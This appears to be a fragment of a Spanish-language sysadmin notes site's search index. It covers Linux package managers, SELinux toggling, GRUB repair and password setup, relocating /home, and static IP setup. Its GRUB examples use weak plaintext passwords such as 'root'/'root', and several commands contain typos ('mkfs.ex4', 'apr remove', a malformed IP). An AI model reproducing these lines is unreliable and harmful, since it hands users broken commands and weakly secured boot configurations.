paquete # instalar paquete dnf reinstall paquete # reinstalar paquete dnf upgrade paquete # actualizar paquete dnf [ remove | erase ] paquete # borrar paquete dnf purge paquete # borrar configuraci\u00f3n paquete dnf autoremove # borrar paquetes inecesarios dnf clean # borrar headers dnf group list # listar grupos de paquetes dnf group install \"grupo\" # instalar grupo dnf repolist # listar repositorios instalados dnf repolist [ enabled | disabled | all ] dnf config-manager --set-disabled repo_id # desabilitar repositorio dnf config-manager --set-enabled repo_id # habilitar reppositorio Paquetes deb Los repositorios oficiales de debian est\u00e1n en la ubicaci\u00f3n /etc/apt/sources.list y los que a\u00f1ades posteriormente en /etc/apt/sources.list.d/ . Su composici\u00f3n es la siguiente: deb http://ftp.caliu.cat/pub/distribucions/debian/ testing main contrib non-free deb-src http://ftp.caliu.cat/pub/distribucions/debian/ testing main contrib non-free deb : indica donde buscar los fitcheros binaris deb-src : indica donde buscar el codigo fuente stable testing oldstable o nombre de distro : que tipo de paquetes usar. main : paquetes oficiales de debian 100% codigo libre contrib : paquetes que pueden tener alguna libreria no libre non-free : paquetes que tienen veneno seg\u00fan el c\u00f3digo libre wiki de debian A\u00f1adir repositorio y su firma echo \"deb https://riot.im/packages/debian/ stretch main\" > /etc/apt/sources.list.d/matrix-riot-im.list curl -L https://riot.im/packages/debian/repo-key.asc | sudo apt-key add Informaci\u00f3n dpkg -l paquete # lista los paquetes que coinciden con el patron dpkg -L paquete # muestra la lista de ficheros instalador por el paquete dpkg -S /bin/ping # busca a que paquete pertenece ese fichero dpkg -s paquete # muestra el estado actual de un paquete dpkg -p paquete # muestra detalles sobre un paquete instalado dpkg -I paquete # informacion del paquete Acciones dpkg -i paquete.deb # instala un paquete dpkg -r paquete # borra un paquete dpkg -P paquete # borra paquete y los ficheros de configuraci\u00f3n dpkg -C paquete # busa ficheros instalados parcialmente y pregunta que hacer dpkg --configure [ opciones ] paquete # reconfigura paquete instalado -ftype, --frontend=type : Seleccioneu el frontend a utilitzar -pvalue, --priority=value : Especifica el llindar m\u00ednim de prioritat. Tots les opcions de configuraci\u00f3 igual o per sobre d'aquest llindar, seran mostrades. --default-priority : Utilitzar la prioritat per defecte. -a, --all : Configurar tots els paquets del sistema que utilitzen debconf -u, --unseen-only : Nom\u00e9s mostra les q\u00fcestions que no han esta contestades pr\u00e8viament. --force : For\u00e7a un dpkg-reconfigure incl\u00fas si el paquet est\u00e0 en un estat inconsistent o trencat. --no-reload : No torna a carregar les plantilles. -h, --help : Mostra com funciona l'ordre. apt Actualizaci\u00f3n apt update # actuliza repositorios apt upgrade # actualiza sistema apt full-upgrade # actualizaca nueva distribuci\u00f3n si la hay apt dist-upgrade # lo mismo Acciones apt search paquete # buscapor nombre o descripcion del paquete apt show paquete # muestra informacion apt download paquete # descarga paquete apt install paquete # intala paquete apt install paquete = version # instala con la version indicada apt reinstall paquete # reinstala apr remove paquete # borra paquete apt source paquete # descarga codigo fuente apt build-dep paquete # compilar dependencias codigo fuente apt -b source paquete # compilar paquete apt --fix-broken install # repara paquetes rotos tasksel --list-task # muestra grupos de paquetes tasksel install paquete # instala grupo de paquetes apt install paquete^ # lo mismo Limpieza apt autoclean # borra paquetes que no se necesitan apt autoremove # borra paquetes que eran dependencias de otros y ya no se usan apt purge paquete # borra cconfiguracion del paquete apt list [ --install | --upgradable | --all-versions ] # muesta informacion Reparaci\u00f3n En ocasiones se queda alg\u00fan paquete mal instalado y obstaculiza la gesti\u00f3n de nuevos paquetes. sudo fuser -vki /var/lib/dpkg/lock rm /var/lib/dpkg/lock dpkg --configure -a sudo apt-get autoremove Lo que estamos haciendo es: matar todos los procesos que est\u00e1n utilizando dicho archivo borrar el archivo, re-configurar todos los paquetes por si a quedado alguno en mal estado. Borrar los que no son necesarios. Paquetes pkt Los repositorios pacman se encuentran en /etc/pacman.conf , cada [opcion] se refiere a un repositorio distinto. Es importante que los oficiales est\u00e9n por encima de los no oficiales , ya que buscara por orden de llegada. ... [ core ] SigLevel = PackageRequired Include = /etc/pacman.d/mirrorlist [ extra ] SigLevel = PackageRequired Include = /etc/pacman.d/mirrorlist ... [ archlinuxfr ] SigLevel = Never Server = http://repo.archlinux.fr/ $arch Para a\u00f1adir un repositorio no oficial solo tenemos que editar el pacman.conf como esta de ejemplo en el cuadro de c\u00f3digo anterior y actualizar la base de datos. Para gestionar paquetes de AUR existen diferentes gestores, se recomienda yay, aurman, etc... Pacman Consultas pacman -Q # var paquetes instalados pacman -Qc paquete # mostrar cambios del paquete pacman -Qi paquete # informacion del paquete pacman -Ql paquete # listar archivos del paquete pacman -Qm # ver paquetes instalados que no estan en repos pacman -Qo file # ver a que paquete pertenece el archivo pacman -Qp file # consultar un archivo de paquete pacman -Qs paquete # buscar paquete instalado pacman -P # ver todas las opciones disponibles Acciones pacman -Sw paquete # descargar paquete sin instalar pacman -S paquete # instalar paquete pacman -Ss paquete # buscar paquete ven los repositorios pacman -Su # actualizar sistema pacman -Sy # actualizar base de datos pacman -Syu # actualizar base y sistema pacman -R paquete # borrar paquete pacman -Rs paquete # borrar paquete y sus dependencias pacman -Sc # borrar paquetes cache no instalados","title":"Gestores de paquetes"},{"location":"sistemas/gestores_de_paquetes/#paquetes-rpm","text":"Los paquetes rpm se encuentran en los repositorios que se guardan en /etc/yum.repos.d . Querys rpm -qa # paquetes instalados rpm -ql paquete # ver contenido de paquete instalado rpm -qlp paquete.rpm # ver contenido de paquete sin instalar rpm -qd paquete # ver paquetes de documentaci\u00f3n rpm -qc paquete # ver paquetes de configuraci\u00f3n rpm -qi paquete # informaci\u00f3n del paquete rpm -qp --requires paquete.rpm # ver dependencias del paquete rpm -qp --scripts paquete.rpm # ver scripts pre y post intalaci\u00f3n rpm -qf /usr/bin/useradd # ver a que paquete pertenece un archivo La opci\u00f3n -p es para cuando el paquete esta en el directorio actual rpm -q --whatrequires dhclient # ver quepaquetes usan el indicado NetworkManager-1.2.6-1.fc24.x86_64 dracut-network-044-21.fc24.x86_64 Manejo de rpm rpm -i paquete.rpm # instala paquete rpm -U paquete.rpm # actualizar paquete rpm -e paquete.rpm # eliminar paquete rpm --rebuilddb # actualizar base de datos rpm # -vh permiten visualizar vel progreso en las opciones anteriores. rpm -ivh tftp-server-5.2-18.fc24.x86_64.rpm Preparing... ################################# [100%] Updating / installing... 1 :tftp-server-5.2-18.fc24 ################################# [100%]","title":"Paquetes rpm"},{"location":"sistemas/gestores_de_paquetes/#dnf","text":"dnf list installed # ver paquetes instalados dnf provides orden # ver a que paquete pertenece una orden dnf download paquete # descargar un paquete dnf search paquete # buscar paquete en repositorios dnf update # actualizar repositorios dnf upgrade # actualizar systema dnf dist-upgrade # actualizar distribucion dnf install paquete # instalar paquete dnf reinstall paquete # reinstalar paquete dnf upgrade paquete # actualizar paquete dnf [ remove | erase ] paquete # borrar paquete dnf purge paquete # borrar configuraci\u00f3n paquete dnf autoremove # borrar paquetes inecesarios dnf clean # borrar headers dnf group list # listar grupos de paquetes dnf group install \"grupo\" # instalar grupo dnf repolist # listar repositorios instalados dnf repolist [ enabled | disabled | all ] dnf config-manager --set-disabled repo_id # desabilitar repositorio dnf config-manager --set-enabled repo_id # habilitar reppositorio","title":"dnf"},{"location":"sistemas/gestores_de_paquetes/#paquetes-deb","text":"Los repositorios oficiales de debian est\u00e1n en la ubicaci\u00f3n /etc/apt/sources.list y los que a\u00f1ades posteriormente en /etc/apt/sources.list.d/ . Su composici\u00f3n es la siguiente: deb http://ftp.caliu.cat/pub/distribucions/debian/ testing main contrib non-free deb-src http://ftp.caliu.cat/pub/distribucions/debian/ testing main contrib non-free deb : indica donde buscar los fitcheros binaris deb-src : indica donde buscar el codigo fuente stable testing oldstable o nombre de distro : que tipo de paquetes usar. main : paquetes oficiales de debian 100% codigo libre contrib : paquetes que pueden tener alguna libreria no libre non-free : paquetes que tienen veneno seg\u00fan el c\u00f3digo libre wiki de debian A\u00f1adir repositorio y su firma echo \"deb https://riot.im/packages/debian/ stretch main\" > /etc/apt/sources.list.d/matrix-riot-im.list curl -L https://riot.im/packages/debian/repo-key.asc | sudo apt-key add Informaci\u00f3n dpkg -l paquete # lista los paquetes que coinciden con el patron dpkg -L paquete # muestra la lista de ficheros instalador por el paquete dpkg -S /bin/ping # busca a que paquete pertenece ese fichero dpkg -s paquete # muestra el estado actual de un paquete dpkg -p paquete # muestra detalles sobre un paquete instalado dpkg -I paquete # informacion del paquete Acciones dpkg -i paquete.deb # instala un paquete dpkg -r paquete # borra un paquete dpkg -P paquete # borra paquete y los ficheros de configuraci\u00f3n dpkg -C paquete # busa ficheros instalados parcialmente y pregunta que hacer dpkg --configure [ opciones ] paquete # reconfigura paquete instalado -ftype, --frontend=type : Seleccioneu el frontend a utilitzar -pvalue, --priority=value : Especifica el llindar m\u00ednim de prioritat. Tots les opcions de configuraci\u00f3 igual o per sobre d'aquest llindar, seran mostrades. --default-priority : Utilitzar la prioritat per defecte. -a, --all : Configurar tots els paquets del sistema que utilitzen debconf -u, --unseen-only : Nom\u00e9s mostra les q\u00fcestions que no han esta contestades pr\u00e8viament. --force : For\u00e7a un dpkg-reconfigure incl\u00fas si el paquet est\u00e0 en un estat inconsistent o trencat. --no-reload : No torna a carregar les plantilles. -h, --help : Mostra com funciona l'ordre.","title":"Paquetes deb"},{"location":"sistemas/gestores_de_paquetes/#apt","text":"Actualizaci\u00f3n apt update # actuliza repositorios apt upgrade # actualiza sistema apt full-upgrade # actualizaca nueva distribuci\u00f3n si la hay apt dist-upgrade # lo mismo Acciones apt search paquete # buscapor nombre o descripcion del paquete apt show paquete # muestra informacion apt download paquete # descarga paquete apt install paquete # intala paquete apt install paquete = version # instala con la version indicada apt reinstall paquete # reinstala apr remove paquete # borra paquete apt source paquete # descarga codigo fuente apt build-dep paquete # compilar dependencias codigo fuente apt -b source paquete # compilar paquete apt --fix-broken install # repara paquetes rotos tasksel --list-task # muestra grupos de paquetes tasksel install paquete # instala grupo de paquetes apt install paquete^ # lo mismo Limpieza apt autoclean # borra paquetes que no se necesitan apt autoremove # borra paquetes que eran dependencias de otros y ya no se usan apt purge paquete # borra cconfiguracion del paquete apt list [ --install | --upgradable | --all-versions ] # muesta informacion Reparaci\u00f3n En ocasiones se queda alg\u00fan paquete mal instalado y obstaculiza la gesti\u00f3n de nuevos paquetes. sudo fuser -vki /var/lib/dpkg/lock rm /var/lib/dpkg/lock dpkg --configure -a sudo apt-get autoremove Lo que estamos haciendo es: matar todos los procesos que est\u00e1n utilizando dicho archivo borrar el archivo, re-configurar todos los paquetes por si a quedado alguno en mal estado. Borrar los que no son necesarios.","title":"apt"},{"location":"sistemas/gestores_de_paquetes/#paquetes-pkt","text":"Los repositorios pacman se encuentran en /etc/pacman.conf , cada [opcion] se refiere a un repositorio distinto. Es importante que los oficiales est\u00e9n por encima de los no oficiales , ya que buscara por orden de llegada. ... [ core ] SigLevel = PackageRequired Include = /etc/pacman.d/mirrorlist [ extra ] SigLevel = PackageRequired Include = /etc/pacman.d/mirrorlist ... [ archlinuxfr ] SigLevel = Never Server = http://repo.archlinux.fr/ $arch Para a\u00f1adir un repositorio no oficial solo tenemos que editar el pacman.conf como esta de ejemplo en el cuadro de c\u00f3digo anterior y actualizar la base de datos. Para gestionar paquetes de AUR existen diferentes gestores, se recomienda yay, aurman, etc...","title":"Paquetes pkt"},{"location":"sistemas/gestores_de_paquetes/#pacman","text":"Consultas pacman -Q # var paquetes instalados pacman -Qc paquete # mostrar cambios del paquete pacman -Qi paquete # informacion del paquete pacman -Ql paquete # listar archivos del paquete pacman -Qm # ver paquetes instalados que no estan en repos pacman -Qo file # ver a que paquete pertenece el archivo pacman -Qp file # consultar un archivo de paquete pacman -Qs paquete # buscar paquete instalado pacman -P # ver todas las opciones disponibles Acciones pacman -Sw paquete # descargar paquete sin instalar pacman -S paquete # instalar paquete pacman -Ss paquete # buscar paquete ven los repositorios pacman -Su # actualizar sistema pacman -Sy # actualizar base de datos pacman -Syu # actualizar base y sistema pacman -R paquete # borrar paquete pacman -Rs paquete # borrar paquete y sus dependencias pacman -Sc # borrar paquetes cache no instalados","title":"Pacman"},{"location":"sistemas/getenforce/","text":"getenforce getenforce es un sistema de seguridad extra los permisos adicionales. permissive \u2192 Desactivada, \u00fatil para cuando juegas con las particiones o ficheros del sistema. setenforce 0 # desactivar temporalmente enforce \u2192 activada, siempre ha de estar activada por posibles ataques. setenforce 1 # activar temporalmente Activar o desactivar permanentemente. modificar el siguete archivo: /etc/selinux/config --- SELINUX = enforcing ---","title":"getenforce"},{"location":"sistemas/getenforce/#getenforce","text":"getenforce es un sistema de seguridad extra los permisos adicionales. permissive \u2192 Desactivada, \u00fatil para cuando juegas con las particiones o ficheros del sistema. setenforce 0 # desactivar temporalmente enforce \u2192 activada, siempre ha de estar activada por posibles ataques. setenforce 1 # activar temporalmente Activar o desactivar permanentemente. modificar el siguete archivo: /etc/selinux/config --- SELINUX = enforcing ---","title":"getenforce"},{"location":"sistemas/grub/","text":"Grub Cambiar grub a partici\u00f3n dedicada. Primero de todo creamos una partici\u00f3n de unos 500M. sudo fdisk /dev/sda Damos por hecho que crea por ejemplo sda2. La formateamos. sudo mkfs.ex4 /dev/sda2 Copiamos el contenido de nuestra carpeta boot en ella. ( antes tendremos que montarla por ejemplo como /mnt) Montamos /mnt en sda2 ( futuro boot ). sudo mount /dev/sda2 /mnt Copiamos /boot a /mnt. sudo cp -af /boot /mnt Indicamos al MBR donde se encuentra los archivos del nuevo grub. grub2-install --boot-directory = /mnt/boot /dev/sda Ficheros de configuraci\u00f3n de grub y grub2-install grub2-install Lo que hace es decirle al gestor de arranque donde se encuentra la configuraci\u00f3n de grub. Hay que permanecer dentro de la carpeta /boot con todo su contenido para que grub-install haga su correcta instalaci\u00f3n. configuraci\u00f3n grub podemos encontrar el fichero de configuraci\u00f3n de grub en: /boot/grub2/grub.cfg /boot/grub2/menu.lst \u2192 sistemas antiguos. Ah\u00ed nos muestra la ruta que tiene asignada el gestor de arranque al archivo grub.cfg en prefix=(disco,partici\u00f3n)/ruta grub2-mkconfig Nos permite regenerar el archivo grub.cfg. Crea una imagen de la tabla de particiones actual y genera un nuevo grub.cfg. grub2-mkconfig -o /boot/grub2/grub.cfg Sticks de arranque En el caso que el enlace del bootstrap hasta el directorio /boot funcione pero por alguna raz\u00f3n, no encuentre el archivo grub.cfg, aparecer\u00e1 el prompt del grub #grub> desde el que podemos arrancar el sistema de diferentes maneras. Tunear una entrada existente de grub El el caso de querer arrancar un sistema que no esta en el grub.cfg. Escribir en modo comando una entrada. Sabiendo donde esta el sistema operativo podemos arrancar escribiendo manualmente los comandos de la edici\u00f3n de grub del apartado anterior. bash insmod gzio insmod part_msdos insmod ext2 set root='hd0,msdos5' linux16 /boot/vmlinuz-5.0.... root=/dev/sda5 initrd16 /boot/initrd-5.0.. .img En modo comando llamar a alg\u00fan fichero grub.cfg de alguna partici\u00f3n existente. grub> configfile ( hd0,msdos5 ) /boot/grub2/grub.cfg En el caso del link del mbr a la partici\u00f3n donde se encuentra el directorio grub este roto. Grub no podr\u00e1 acceder a los m\u00f3dulos, por lo tanto aparecer\u00e1 grub rescue> al arrancar. La soluci\u00f3n indicar en que partici\u00f3n se encuentra los archivos de grub, a\u00f1adir raiz de destino, y arrancar con el modulo normal. grub recue> set prefix =( hd0,msdos5 ) /boot/grub2 grub recue> set root =( hd0,msdos5 ) grub recue> insmod normal grub recue> normal Re-instalar gestor de arranque windows Iniciamos con una live de hirens o dlcb. Desde partition wizard o similar buscamos la opci\u00f3n rebuild mbr Asegur\u00e1ndonos que se\u00f1alamos a nuestro disco regeneramos mbr Puede que con hirens al ser un mini xp no detecte el disco, es mejor dlcb arrancar con un win10 o una iso de gandalf Edici\u00f3n grub Al generar un grub.cfg en cada entrada lo importante para arrancar son las siguientes lineas: insmod para cargar los m\u00f3dulos necesarios. set root ruta de disco y partici\u00f3n donde buscar archivos. linux16, initrd16 cargar kernel en partici\u00f3n indicada y ramdisk menuentry 'fedora mati' { insmod gzio insmod part_msdos insmod ext2 set root = 'hd0,msdos5' linux16 /boot/vmlinuz-5.0.... root = /dev/sda5 initrd16 /boot/initrd-5.0.. .img } menuentry 'win2' { insmod part_msdos insmod ntfs # en el caso de partici\u00f3n vfat insmod vfat set root =( hd0,2 ) chainloader +1 } # Passar el control a un altre carregador menuentry 'cahinloader' { insmod gzio insmod part_msdos insmod ext2 set root =( hd0,8 ) chainloader +1 } Submenus Crear un submen\u00fa es tan sencillo como englobar todos los menuentry que desees dentro de los claudators de un submen\u00fa. submenu 'submenu mini' { menuentry 'fed 1 min' { .... } menuentry 'fed 1 min rescue' { .... } } Contrase\u00f1a grub Par\u00e1metros de grub definir superusuario set superusers = \"master\" password master 12345 Definir usuarios extra password jane 123 password peter 321 Encriptar contrase\u00f1a # grub2 sudo grub2-mkpasswd-pbkdf2 # grub sudo grub-mkpasswd-pbkdf2 Definir par\u00e1metros dentro del menuentry --unrestricted ( no demana cap contrasenya ) --users jane ( nom\u00e9s pot iniciar l\u2019usuari jane ) --users jane,peter ( nom\u00e9s poden iniciar els usuaris jane i peter ) \u201cNo posem res\u201d ( nom\u00e9s el superuser pot iniciar ) ejemplo grub.cfg ######################## set superusers = \"root\" password root \"root\" password jorge \"jorge\" # contrase\u00f1a encriptada password_pbkdf2 debian grub.pbkdf2.sha512.10000.7D616BB6FF7F0A69226417E3EDC25AA$ ##################### ##################### # pueden entrar todos menuentry 'Debian GNU/Linux' --users unrestricted --class debian --class gnu-linux --$ # pueden entrar debian menuentry 'Debian GNU/Linux' --users debian --class debian --class gnu-linux --$ # pueden entrar debian y jorge menuentry 'Debian GNU/Linux' --users debian,jorge --class debian --class gnu-linux --$ # pueden entrar solo superuser menuentry 'Debian GNU/Linux' --class debian --class gnu-linux --$ Todos estos cambios se perder\u00e1n al hacer grub2-mkconfig -o /boot/grub2/grub.cfg Si queremos que sean permanentes hay que modificar las plantillas del grub Si o esta el siguiente archivo crearlo /etc/grub.d/01_users #!/bin/sh cat << EOF set superusers=\"root\" password root \"root\" password debian \"debian\" EOF /etc/grub.d/10_linux ... CLASS = \"--class gnu-linux --class gnu --class os --users debian\" ... buscar fila siguiente y a\u00f1adir user o la opci\u00f3n que os guste Executar: grub2-mkconfig -o /boot/grub2/grub.cfg Al generar el grub a\u00f1adir\u00e1 lo indicado en los archivos anteriores ### BEGIN /etc/grub.d/01_users ### set superusers = \"root\" password root \"root\" password debian \"debian\" ### END /etc/grub.d/01_users ###","title":"Grub"},{"location":"sistemas/grub/#grub","text":"","title":"Grub"},{"location":"sistemas/grub/#cambiar-grub-a-particion-dedicada","text":"Primero de todo creamos una partici\u00f3n de unos 500M. sudo fdisk /dev/sda Damos por hecho que crea por ejemplo sda2. La formateamos. sudo mkfs.ex4 /dev/sda2 Copiamos el contenido de nuestra carpeta boot en ella. ( antes tendremos que montarla por ejemplo como /mnt) Montamos /mnt en sda2 ( futuro boot ). sudo mount /dev/sda2 /mnt Copiamos /boot a /mnt. sudo cp -af /boot /mnt Indicamos al MBR donde se encuentra los archivos del nuevo grub. grub2-install --boot-directory = /mnt/boot /dev/sda","title":"Cambiar grub a partici\u00f3n dedicada."},{"location":"sistemas/grub/#ficheros-de-configuracion-de-grub-y-grub2-install","text":"grub2-install Lo que hace es decirle al gestor de arranque donde se encuentra la configuraci\u00f3n de grub. Hay que permanecer dentro de la carpeta /boot con todo su contenido para que grub-install haga su correcta instalaci\u00f3n. configuraci\u00f3n grub podemos encontrar el fichero de configuraci\u00f3n de grub en: /boot/grub2/grub.cfg /boot/grub2/menu.lst \u2192 sistemas antiguos. Ah\u00ed nos muestra la ruta que tiene asignada el gestor de arranque al archivo grub.cfg en prefix=(disco,partici\u00f3n)/ruta grub2-mkconfig Nos permite regenerar el archivo grub.cfg. Crea una imagen de la tabla de particiones actual y genera un nuevo grub.cfg. grub2-mkconfig -o /boot/grub2/grub.cfg","title":"Ficheros de configuraci\u00f3n de grub y grub2-install"},{"location":"sistemas/grub/#sticks-de-arranque","text":"En el caso que el enlace del bootstrap hasta el directorio /boot funcione pero por alguna raz\u00f3n, no encuentre el archivo grub.cfg, aparecer\u00e1 el prompt del grub #grub> desde el que podemos arrancar el sistema de diferentes maneras. Tunear una entrada existente de grub El el caso de querer arrancar un sistema que no esta en el grub.cfg. Escribir en modo comando una entrada. Sabiendo donde esta el sistema operativo podemos arrancar escribiendo manualmente los comandos de la edici\u00f3n de grub del apartado anterior. bash insmod gzio insmod part_msdos insmod ext2 set root='hd0,msdos5' linux16 /boot/vmlinuz-5.0.... root=/dev/sda5 initrd16 /boot/initrd-5.0.. .img En modo comando llamar a alg\u00fan fichero grub.cfg de alguna partici\u00f3n existente. grub> configfile ( hd0,msdos5 ) /boot/grub2/grub.cfg En el caso del link del mbr a la partici\u00f3n donde se encuentra el directorio grub este roto. Grub no podr\u00e1 acceder a los m\u00f3dulos, por lo tanto aparecer\u00e1 grub rescue> al arrancar. La soluci\u00f3n indicar en que partici\u00f3n se encuentra los archivos de grub, a\u00f1adir raiz de destino, y arrancar con el modulo normal. grub recue> set prefix =( hd0,msdos5 ) /boot/grub2 grub recue> set root =( hd0,msdos5 ) grub recue> insmod normal grub recue> normal","title":"Sticks de arranque"},{"location":"sistemas/grub/#_1","text":"","title":""},{"location":"sistemas/grub/#re-instalar-gestor-de-arranque-windows","text":"Iniciamos con una live de hirens o dlcb. Desde partition wizard o similar buscamos la opci\u00f3n rebuild mbr Asegur\u00e1ndonos que se\u00f1alamos a nuestro disco regeneramos mbr Puede que con hirens al ser un mini xp no detecte el disco, es mejor dlcb arrancar con un win10 o una iso de gandalf","title":"Re-instalar gestor de arranque windows"},{"location":"sistemas/grub/#edicion-grub","text":"Al generar un grub.cfg en cada entrada lo importante para arrancar son las siguientes lineas: insmod para cargar los m\u00f3dulos necesarios. set root ruta de disco y partici\u00f3n donde buscar archivos. linux16, initrd16 cargar kernel en partici\u00f3n indicada y ramdisk menuentry 'fedora mati' { insmod gzio insmod part_msdos insmod ext2 set root = 'hd0,msdos5' linux16 /boot/vmlinuz-5.0.... root = /dev/sda5 initrd16 /boot/initrd-5.0.. .img } menuentry 'win2' { insmod part_msdos insmod ntfs # en el caso de partici\u00f3n vfat insmod vfat set root =( hd0,2 ) chainloader +1 } # Passar el control a un altre carregador menuentry 'cahinloader' { insmod gzio insmod part_msdos insmod ext2 set root =( hd0,8 ) chainloader +1 }","title":"Edici\u00f3n grub"},{"location":"sistemas/grub/#submenus","text":"Crear un submen\u00fa es tan sencillo como englobar todos los menuentry que desees dentro de los claudators de un submen\u00fa. submenu 'submenu mini' { menuentry 'fed 1 min' { .... } menuentry 'fed 1 min rescue' { .... } }","title":"Submenus"},{"location":"sistemas/grub/#contrasena-grub","text":"Par\u00e1metros de grub definir superusuario set superusers = \"master\" password master 12345 Definir usuarios extra password jane 123 password peter 321 Encriptar contrase\u00f1a # grub2 sudo grub2-mkpasswd-pbkdf2 # grub sudo grub-mkpasswd-pbkdf2 Definir par\u00e1metros dentro del menuentry --unrestricted ( no demana cap contrasenya ) --users jane ( nom\u00e9s pot iniciar l\u2019usuari jane ) --users jane,peter ( nom\u00e9s poden iniciar els usuaris jane i peter ) \u201cNo posem res\u201d ( nom\u00e9s el superuser pot iniciar ) ejemplo grub.cfg ######################## set superusers = \"root\" password root \"root\" password jorge \"jorge\" # contrase\u00f1a encriptada password_pbkdf2 debian grub.pbkdf2.sha512.10000.7D616BB6FF7F0A69226417E3EDC25AA$ ##################### ##################### # pueden entrar todos menuentry 'Debian GNU/Linux' --users unrestricted --class debian --class gnu-linux --$ # pueden entrar debian menuentry 'Debian GNU/Linux' --users debian --class debian --class gnu-linux --$ # pueden entrar debian y jorge menuentry 'Debian GNU/Linux' --users debian,jorge --class debian --class gnu-linux --$ # pueden entrar solo superuser menuentry 'Debian GNU/Linux' --class debian --class gnu-linux --$ Todos estos cambios se perder\u00e1n al hacer grub2-mkconfig -o /boot/grub2/grub.cfg Si queremos que sean permanentes hay que modificar las plantillas del grub Si o esta el siguiente archivo crearlo /etc/grub.d/01_users #!/bin/sh cat << EOF set superusers=\"root\" password root \"root\" password debian \"debian\" EOF /etc/grub.d/10_linux ... CLASS = \"--class gnu-linux --class gnu --class os --users debian\" ... buscar fila siguiente y a\u00f1adir user o la opci\u00f3n que os guste Executar: grub2-mkconfig -o /boot/grub2/grub.cfg Al generar el grub a\u00f1adir\u00e1 lo indicado en los archivos anteriores ### BEGIN /etc/grub.d/01_users ### set superusers = \"root\" password root \"root\" password debian \"debian\" ### END /etc/grub.d/01_users ###","title":"Contrase\u00f1a grub"},{"location":"sistemas/home/","text":"Cambiar /home Cambiar /home de partici\u00f3n Crear la carpeta /home en una partici\u00f3n sirve para seguridad de p\u00e9rdida de datos y poderla compartir con diferentes sistemas operativos UNIX. Mirar el espacio que usa tu /home con du o ncdu. Crear partici\u00f3n relativa al tama\u00f1o del /home piensa que crecer\u00e1 en un futuro, crearla el doble de grande. sudo fdisk /dev/<partci\u00f3n> o desde gr\u00e1fico con gparted Montar la partici\u00f3n nueva como /tmp o /mnt por ejemplo sudo mount /dev/<partici\u00f3n> /mnt Copiar el /home con: sudo cp -af <origen> <destino> sudo cp -af /home/* /mnt Desmontar /tmp o lo que hayas montado en la partici\u00f3n nueva. sudo umount /mnt Montar el /home de la partici\u00f3n nueva sudo mount /dev/<partici\u00f3n> /home A\u00f1adirlo al archivo /etc/fstab --- UUID = 1abaa252-48c7-4002-957b-68de8fbed75f /home ext4 defaults 1 1 Desmontar la partici\u00f3n /home creada, para comprobar el cambio de fstab este bien hecho. Y comprobar con sudo mount -a que la detecte bien. sudo mount -a Cambiar /home de windows crear una partici\u00f3n ntfs de un tama\u00f1o considerable que preveas que cabr\u00e1n todos tus documentos. Ir a disco local C: Usuarios. en mi caso jorge. En cada archivo que haya dentro tipo, descargas, docs, im\u00e1genes etc.. propiedades ubicaci\u00f3n cambiar ubicaci\u00f3n C: por destino deseado en mi caso F:","title":"Cambiar /home"},{"location":"sistemas/home/#cambiar-home","text":"","title":"Cambiar /home"},{"location":"sistemas/home/#cambiar-home-de-particion","text":"Crear la carpeta /home en una partici\u00f3n sirve para seguridad de p\u00e9rdida de datos y poderla compartir con diferentes sistemas operativos UNIX. Mirar el espacio que usa tu /home con du o ncdu. Crear partici\u00f3n relativa al tama\u00f1o del /home piensa que crecer\u00e1 en un futuro, crearla el doble de grande. sudo fdisk /dev/<partci\u00f3n> o desde gr\u00e1fico con gparted Montar la partici\u00f3n nueva como /tmp o /mnt por ejemplo sudo mount /dev/<partici\u00f3n> /mnt Copiar el /home con: sudo cp -af <origen> <destino> sudo cp -af /home/* /mnt Desmontar /tmp o lo que hayas montado en la partici\u00f3n nueva. sudo umount /mnt Montar el /home de la partici\u00f3n nueva sudo mount /dev/<partici\u00f3n> /home A\u00f1adirlo al archivo /etc/fstab --- UUID = 1abaa252-48c7-4002-957b-68de8fbed75f /home ext4 defaults 1 1 Desmontar la partici\u00f3n /home creada, para comprobar el cambio de fstab este bien hecho. Y comprobar con sudo mount -a que la detecte bien. sudo mount -a","title":"Cambiar /home de partici\u00f3n"},{"location":"sistemas/home/#cambiar-home-de-windows","text":"crear una partici\u00f3n ntfs de un tama\u00f1o considerable que preveas que cabr\u00e1n todos tus documentos. Ir a disco local C: Usuarios. en mi caso jorge. En cada archivo que haya dentro tipo, descargas, docs, im\u00e1genes etc.. propiedades ubicaci\u00f3n cambiar ubicaci\u00f3n C: por destino deseado en mi caso F:","title":"Cambiar /home de windows"},{"location":"sistemas/ip_est%C3%A1tica/","text":"ip est\u00e1tica raspberry Wlan /etc/network/interfaces auto wlan0 iface lo inet loopback allow-hotplug wlan0 iface wlan0 inet static address <ip desitjada> netmask <m\u00e0scara> gateway <gateway> wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf iface default inet dhcp /etc/wpa_supplicant/wpa_supplicant.conf network ={ ssid = \"<ssid xarxa>\" psk = \"<contrasenya>\" } eth0 /etc/network/interfaces auto eth0 iface lo inet loopback iface eth0 inet static address 192 .168.1.75 netmask 255 .255.255.0 gateway 192 .168.1.1 IP est\u00e1tica fedora. buscar el archivo: /etc/sysconfig/network-scripts/ modificar. DEVICE = eth0 <nombre tarjeta de red> BOOTPROTO = static DNS1 = 8 .8.8.8 <tu dns/gateway> DNS2 = 4 .4.4.4 GATEWAY = 192 .168.0.1 <gateway> HOSTNAME = node01.tecmint.com <Nombre que te ven en l\u00ednea> IPADDR = 192 .68.0.100 <IP-deseada> NETMASK = 255 .255.255.0 <Mascara> TYPE = Ethernet NETWORKING_IPV6 = no <opcional> IPV6INIT = no <opcional> actualizar lo cambios. sudo systemctl restart network","title":"ip est\u00e1tica raspberry"},{"location":"sistemas/ip_est%C3%A1tica/#ip-estatica-raspberry","text":"","title":"ip est\u00e1tica raspberry"},{"location":"sistemas/ip_est%C3%A1tica/#wlan","text":"/etc/network/interfaces auto wlan0 iface lo inet loopback allow-hotplug wlan0 iface wlan0 inet static address <ip desitjada> netmask <m\u00e0scara> gateway <gateway> wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf iface default inet dhcp /etc/wpa_supplicant/wpa_supplicant.conf network ={ ssid = \"<ssid xarxa>\" psk = \"<contrasenya>\" }","title":"Wlan"},{"location":"sistemas/ip_est%C3%A1tica/#eth0","text":"/etc/network/interfaces auto eth0 iface lo inet loopback iface eth0 inet static address 192 .168.1.75 netmask 255 .255.255.0 gateway 192 .168.1.1","title":"eth0"},{"location":"sistemas/ip_est%C3%A1tica/#ip-estatica-fedora","text":"buscar el archivo: /etc/sysconfig/network-scripts/ modificar. DEVICE = eth0 <nombre tarjeta de red> BOOTPROTO = static DNS1 = 8 .8.8.8 <tu 